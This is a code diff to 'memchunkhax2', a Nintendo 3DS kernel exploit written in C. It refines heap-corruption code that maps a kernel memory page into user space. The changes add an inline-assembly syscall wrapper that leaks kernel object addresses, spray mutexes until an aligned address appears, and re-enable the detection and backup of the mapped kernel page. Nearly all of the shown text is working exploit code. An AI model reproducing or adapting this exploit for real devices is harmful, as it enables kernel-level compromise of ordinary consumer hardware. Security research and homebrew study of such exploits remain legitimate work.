@@ -4,6 +4,7 @@
 
 #include <stdio.h>
 #include <stdlib.h>
+#include <string.h>
 
 #define SLAB_HEAP_VIRT 0xFFF70000 // 9.2
 #define SLAB_HEAP_PHYS 0x1FFA0000
@@ -50,6 +51,19 @@ static void allocate_thread(void* arg) {
     data->result = svcControlMemory(&data->addr, data->addr, 0, data->size, MEMOP_ALLOC, (MemPerm) (MEMPERM_READ | MEMPERM_WRITE));
 }
 
+static Result __attribute__((naked)) svcCreateMutexKAddr(Handle* handle, bool initially_locked, u32* kaddr) {
+    asm volatile(
+            "str r0, [sp, #-4]!\n"
+            "str r2, [sp, #-4]!\n"
+            "svc 0x13\n"
+            "ldr r3, [sp], #4\n"
+            "str r2, [r3]\n"
+            "ldr r3, [sp], #4\n"
+            "str r1, [r3]\n"
+            "bx lr"
+    );
+}
+
 // Executes exploit.
 void execute_memchunkhax2() {
     printf("Setting up...\n");
@@ -61,7 +75,8 @@ void execute_memchunkhax2() {
     void* backup = malloc(PAGE_SIZE);
     u32 isolatedPage = 0;
     u32 isolatingPage = 0;
-    Handle kObjHandle = 0;
+    Handle handles[32] = {0};
+    int handlesCreated = 0;
     u32 kObjAddr = 0;
     Thread delayThread = NULL;
 
@@ -121,13 +136,14 @@ void execute_memchunkhax2() {
     // If next is not 0, it will continue to whatever is pointed to by it.
     // Even if this eventually reaches an end, it will continue decrementing the remaining size value.
     // This will roll over, and panic when it thinks that there is more memory to allocate than was available.
-    if(R_FAILED(svcCreateMutex(&kObjHandle, 0))) {
-        printf("Failed to create KSynchronizationObject.\n");
-        goto cleanup;
-    }
+    while((kObjAddr & 0xFFFF) != 0x3010) {
+        if(handlesCreated >= 32 || R_FAILED(svcCreateMutexKAddr(&handles[handlesCreated], 0, &kObjAddr))) {
+            printf("Failed to create KSynchronizationObject.\n");
+            goto cleanup;
+        }
 
-    // Pull the kernel address of the created object from r2.
-    asm("mov %0, r2" : "=r"(kObjAddr));
+        handlesCreated++;
+    }
 
     // Convert the object address to a value that will properly convert to a physical address during mapping.
     kObjAddr = kObjAddr - SLAB_HEAP_VIRT + SLAB_HEAP_PHYS - KERNEL_VIRT_TO_PHYS;
@@ -141,7 +157,7 @@ void execute_memchunkhax2() {
         goto cleanup;
     }
 
-    // Create thread to allocate pages.
+    // Create thread to allocate pagges.
     if(threadCreate(allocate_thread, data, 0x4000, 0x3F, 1, true) == NULL) {
         printf("Failed to create allocation thread.\n");
         goto cleanup;
@@ -154,10 +170,10 @@ void execute_memchunkhax2() {
     ((MemChunkHdr*) data->addr)->next = (MemChunkHdr*) kObjAddr;
 
     // Use svcArbitrateAddress to detect when the kernel memory page has been mapped.
-    //while((u32) svcArbitrateAddress(arbiter, data->addr + PAGE_SIZE, ARBITRATION_WAIT_IF_LESS_THAN_TIMEOUT, 0, 0) == 0xD9001814);
+    while((u32) svcArbitrateAddress(arbiter, data->addr + PAGE_SIZE, ARBITRATION_WAIT_IF_LESS_THAN_TIMEOUT, 0, 0) == 0xD9001814);
 
     // Back up the kernel page before it is cleared.
-    //memcpy(backup, (void*) (data->addr + PAGE_SIZE), PAGE_SIZE);
+    memcpy(backup, (void*) (data->addr + PAGE_SIZE), PAGE_SIZE);
 
     printf("Overwrite complete.\n");
 
@@ -168,27 +184,27 @@ void execute_memchunkhax2() {
 
     // Wait for memory mapping to complete.
     while(data->result == -1) {
-        svcSleepThread(1000000);
+        svcSleepThread(10000);
     }
 
     printf("Map complete.\n");
 
-    //printf("Backup value: %08X\n", *(int*) (backup));
-
     // Restore the kernel page backup.
-    //memcpy((void*) (memAddr + PAGE_SIZE), backup, PAGE_SIZE);
+    memcpy((void*) (data->addr + PAGE_SIZE), backup, PAGE_SIZE);
+
+    printf("Restored kernel memory.\n");
 
     // Fill the mapped memory with pointers to our vtable.
-    for(int i = 0; i < PAGE_SIZE; i += 4) {
+    /* for(int i = 0; i < PAGE_SIZE; i += 4) {
         *(u32*) (data->addr + PAGE_SIZE + i) = (u32) osConvertVirtToPhys(vtable) - KERNEL_VIRT_TO_PHYS;
-    }
+    } */
 
     if(R_FAILED(data->result)) {
         printf("Failed to map memory.\n");
         goto cleanup;
     }
 
-    cleanup:
+cleanup:
     printf("Cleaning up...\n");
 
     if(data != NULL && data->result == 0) {
@@ -218,8 +234,10 @@ void execute_memchunkhax2() {
         free(data);
     }
 
-    if(kObjHandle != 0) {
-        svcCloseHandle(kObjHandle);
+    if(handlesCreated > 0) {
+        for(int i = 0; i < handlesCreated; i++) {
+            svcCloseHandle(handles[i]);
+        }
     }
 
     printf("Test value: %08X\n", (int) testVal);
